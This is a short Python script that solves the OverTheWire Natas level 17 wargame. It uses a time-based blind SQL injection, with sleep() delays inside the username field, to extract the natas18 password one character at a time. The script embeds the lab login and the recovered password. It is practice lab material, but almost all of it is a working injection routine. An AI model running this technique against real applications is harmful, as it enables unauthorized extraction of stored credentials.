import requests
import time

url = "http://natas17.natas.labs.overthewire.org:80/index.php?debug=1"
login = ('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')
# input = """natas18" and password like binary '%d%' and sleep(5) #"""
# print(input)

found_password = "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP"
charset = [chr(ord('a')+i) for i in range(26)] + [chr(ord('A')+i) for i in range(26)] + [i for i in range(10)]


# filtered = []

# for c in charset:
  #  query = f"""natas18" and password like binary '%{c}%' and sleep(2) #"""
  #  data = {"username": query}
  #  start = time.time()
  #  r = requests.post(url, data, auth=login)
  #  finish = time.time()
  #  print(r.text)
  #  if (finish - start > 1):
  #      filtered.append(c)
  #      print(f"{c}")
        # print(f"Query took {finish - start} seconds")


# print(filtered)

filtered = ['d', 'g', 'h', 'j', 'l', 'm', 'p', 'q', 's', 'v', 'w', 'x', 'y', 'C', 'D', 'F', 'I', 'K', 'O', 'P', 'R', '0', '4', '7']
password = ""
found = "xvKIqDjy4OPv7wCRgDl"
for i in range(13):
    for c in filtered:
        query = f"""natas18" and password like binary '{found + password + str(c)}%' and sleep(5) #"""
        data = {"username": query}
        start = time.time()
        r = requests.post(url, data, auth=login)
        finish = time.time()
        # print(r.text)
        if (finish - start > 4):
            password += str(c)
            print(found + password)
            # print(f"Query took {finish - start} seconds")
            break
    
